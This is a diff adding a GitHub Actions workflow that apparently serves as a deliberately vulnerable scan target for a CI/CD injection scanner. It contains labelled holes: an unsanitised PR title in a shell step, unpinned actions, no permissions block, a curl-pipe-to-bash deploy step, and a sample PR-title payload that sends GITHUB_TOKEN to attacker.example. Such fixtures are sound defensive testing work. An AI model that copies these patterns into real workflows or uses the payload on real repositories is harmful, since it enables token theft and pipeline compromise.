@@ -1,0 +1,47 @@
+# LAB ATK3: VULNERABLE workflow example
+# This file intentionally contains CI/CD injection vulnerabilities for demonstration.
+# DO NOT use in production. Used as a scan target for the backend /v1/scan/ci-cd-injection API.
+#
+# Vulnerabilities present:
+#   RULE-01: PR title interpolated directly into run: shell command (script injection)
+#   RULE-03: actions/checkout pinned to @main (unpinned floating tag)
+#   RULE-03: actions/setup-node pinned to @v3 (unpinned floating major tag)
+#   RULE-04: No permissions block (GITHUB_TOKEN defaults to broad write access)
+#   RULE-05: curl | bash pattern in deploy step
+
+name: Vulnerable CI
+
+on:
+  pull_request:
+    branches: ["main"]
+
+jobs:
+  build:
+    name: Build and Test
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@main          # RULE-03: unpinned @main
+
+      - name: Setup Node
+        uses: actions/setup-node@v3          # RULE-03: unpinned @v3
+        with:
+          node-version: "20"
+
+      - name: Print PR info
+        # RULE-01: ${{ github.event.pull_request.title }} interpolated directly into shell
+        # Attacker payload: PR title = "a'; curl attacker.example?t=$GITHUB_TOKEN #"
+        run: |
+          echo "Building PR: ${{ github.event.pull_request.title }}"
+          echo "Branch: ${{ github.head_ref }}"
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Run tests
+        run: npm test --if-present
+
+      - name: Deploy
+        # RULE-05: curl | bash, if CDN is MITM'd or poisoned, attacker controls this
+        run: curl -s https://deploy.example.com/deploy.sh | bash
